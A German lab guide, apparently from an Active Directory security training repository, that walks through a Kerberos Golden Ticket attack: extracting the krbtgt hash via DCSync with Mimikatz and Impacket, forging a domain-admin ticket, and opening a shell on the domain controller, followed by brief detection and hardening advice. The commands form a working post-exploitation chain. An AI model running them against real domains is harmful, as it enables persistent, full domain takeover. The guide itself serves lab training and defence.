# 03 – Golden Ticket

Fälschung eines **TGT** (Ticket Granting Ticket) mit dem Schlüssel des `krbtgt`-Kontos.
Damit lässt sich domänenweit **jede beliebige Identität** annehmen — inkl. nicht existierender
Konten und beliebiger Gruppenmitgliedschaften (via PAC).

> ⚠️ Nur im isolierten Lab. Golden Ticket ist eine **Persistenz-/Post-Exploitation-Technik**:
> man braucht **bereits** hohe Rechte (Domänenadmin bzw. Replikationsrechte), um an den
> `krbtgt`-Hash zu kommen. Es ist kein Weg zum *initialen* Zugriff, sondern verschafft danach
> quasi-unbegrenzte, langlebige Kontrolle.

## Voraussetzungen

| Benötigt | Wie im Lab beschaffen |
|----------|-----------------------|
| **`krbtgt`-Hash** (NTLM oder AES) | DCSync (siehe unten) — braucht DA/Replikationsrechte |
| **Domänen-SID** | `Get-ADDomain \| Select DomainSID` bzw. `whoami /user` |
| Zielbenutzername | frei wählbar (z. B. vorhandener oder erfundener Admin) |

## Schritt 1 – `krbtgt`-Hash + SID beschaffen (DCSync)

**Windows / Mimikatz** (als Domänenadmin, z. B. `LAB\labadmin` auf PC1):

```
lsadump::dcsync /domain:lab.local /user:krbtgt
```
liefert `NTLM` (RC4) und `aes256_hmac` des `krbtgt`.

**Linux / Impacket** (von VM1):

```bash
secretsdump.py LAB/labadmin:'Admin_Lab_2024!'@10.10.10.10 -just-dc-user krbtgt
```

SID ermitteln:

```powershell
Get-ADDomain | Select-Object -ExpandProperty DomainSID
# S-1-5-21-1111111111-2222222222-3333333333
```

## Schritt 2 – Golden Ticket erstellen & nutzen

### Variante A — Mimikatz (Windows, z. B. auf PC1)

```
kerberos::purge
kerberos::golden /user:FakeAdmin /domain:lab.local ^
  /sid:S-1-5-21-1111111111-2222222222-3333333333 ^
  /krbtgt:<NTLM-HASH_von_krbtgt> ^
  /id:500 /groups:512 ^
  /ptt
```
- `/ptt` injiziert das Ticket direkt in die aktuelle Session (Pass-the-Ticket).
- `/id:500` = RID Administrator, `/groups:512` = Domain Admins.
- **Lab-Hinweis:** Mimikatz setzt standardmäßig eine **10-Jahres-Lebensdauer** — genau das ist
  ein starker Erkennungsindikator (siehe Detection). Für realistischere Tests
  `/startoffset /endin /renewmax` setzen.

Alternativ mit **AES** statt RC4 (leiser, kein RC4-Downgrade-IOC):
`/aes256:<aes256-key>` statt `/krbtgt:`.

### Variante B — Impacket (Linux, VM1)

```bash
# Ticket erzeugen -> schreibt FakeAdmin.ccache
ticketer.py -nthash <NTLM-HASH_von_krbtgt> \
  -domain-sid S-1-5-21-1111111111-2222222222-3333333333 \
  -domain lab.local FakeAdmin

export KRB5CCNAME=$(pwd)/FakeAdmin.ccache
```

## Schritt 3 – Nachweis (Zugriff als „Domänenadmin")

**Windows (nach `/ptt`):**
```
klist
dir \\dc1.lab.local\c$
```

**Linux/Impacket (mit gesetztem KRB5CCNAME):**
```bash
psexec.py -k -no-pass lab.local/FakeAdmin@dc1.lab.local
# oder:
smbexec.py -k -no-pass lab.local/FakeAdmin@dc1.lab.local
```
Erfolgreicher Shell-/C$-Zugriff auf DC1 belegt den Angriff. Screenshot/Log in `notes/` ablegen
(nicht committen — greift `.gitignore`).

## Detection & Hardening (Kurzform)

**Erkennung** (Details in [`05-detection-hardening.md`](05-detection-hardening.md)):
- TGT mit **unrealistischer Lebensdauer** (Mimikatz-Default 10 Jahre).
- **4769** (Service-Ticket) **ohne vorheriges 4768** (AS-REQ) für dasselbe Konto.
- **RC4** (Enc-Type `0x17`), obwohl die Domäne AES nutzt.
- Tickets für **nicht existierende Konten** / inkonsistente PAC-Daten.

**Härtung:**
- `krbtgt`-Passwort **zweimal** rotieren (mit Wartezeit dazwischen) — invalidiert alle Golden
  Tickets. Nach jedem DA-Kompromiss Pflicht.
- **RC4 deaktivieren**, AES erzwingen; PAC-Validierung.
- Least Privilege / Tiering, `Protected Users`, Monitoring auf DCSync (4662).
